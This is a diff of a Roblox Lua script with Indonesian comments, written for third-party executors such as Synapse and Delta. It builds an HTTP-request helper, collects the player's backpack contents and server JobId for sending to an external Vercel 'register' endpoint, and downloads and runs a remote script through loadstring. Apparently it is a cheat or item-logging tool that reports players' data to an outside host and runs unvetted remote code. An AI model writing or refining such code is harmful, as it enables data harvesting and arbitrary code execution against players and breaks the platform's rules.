@@ -1,5 +1,6 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local DateTime = DateTime -- pastikan DateTime sudah ada (roblox 2023+)
 
 -- ============ KONFIGURASI ============
 local API_ENDPOINT = "https://backend-vercel-ashy.vercel.app/api/register.js"
@@ -13,7 +14,10 @@ local jobId = game.JobId
 -- Fungsi HTTP request dengan fallback ke executor populer
 local function httpRequest(url, method, body, headers)
 	local requestFunc = syn and syn.request or http_request or request
-	if not requestFunc then return nil end
+	if not requestFunc then
+		warn("❌ Executor tidak mendukung HTTP request")
+		return nil
+	end
 
 	local success, response = pcall(function()
 		return requestFunc({
@@ -42,30 +46,29 @@ local function getBackpackContents()
 	return #contents > 0 and table.concat(contents, ", ") or "Backpack kosong"
 end
 
--- Eksekusi script eksternal
+-- Eksekusi script eksternal (disesuaikan untuk Delta Executor)
 local function executeExternalScript()
-    local success, scriptContent = pcall(function()
-        return HttpService:GetAsync(EXTERNAL_SCRIPT)
-    end)
+	local success, scriptContent = pcall(function()
+		return HttpService:GetAsync(EXTERNAL_SCRIPT)
+	end)
 
-    if success and scriptContent then
-        local loaded, err = loadstring(scriptContent)
-        if not loaded and syn and syn.loadstring then
-            -- fallback ke syn.loadstring kalau loadstring gagal (biasanya di Delta ini bisa)
-            loaded, err = syn.loadstring(scriptContent)
-        end
-        
-        if loaded then
-            local runSuccess, runErr = pcall(loaded)
-            if not runSuccess then
-                warn("⚠️ Gagal menjalankan script eksternal:", runErr)
-            end
-        else
-            warn("⚠️ Gagal memuat script eksternal:", err)
-        end
-    else
-        warn("⚠️ Tidak dapat mengambil script dari URL:", EXTERNAL_SCRIPT)
-    end
+	if success and scriptContent then
+		local loaded, err = loadstring(scriptContent)
+		if not loaded and syn and syn.loadstring then
+			loaded, err = syn.loadstring(scriptContent)
+		end
+
+		if loaded then
+			local runSuccess, runErr = pcall(loaded)
+			if not runSuccess then
+				warn("⚠️ Gagal menjalankan script eksternal:", runErr)
+			end
+		else
+			warn("⚠️ Gagal memuat script eksternal:", err)
+		end
+	else
+		warn("⚠️ Tidak dapat mengambil script dari URL:", EXTERNAL_SCRIPT)
+	end
 end
 
 -- Kirim data ke API
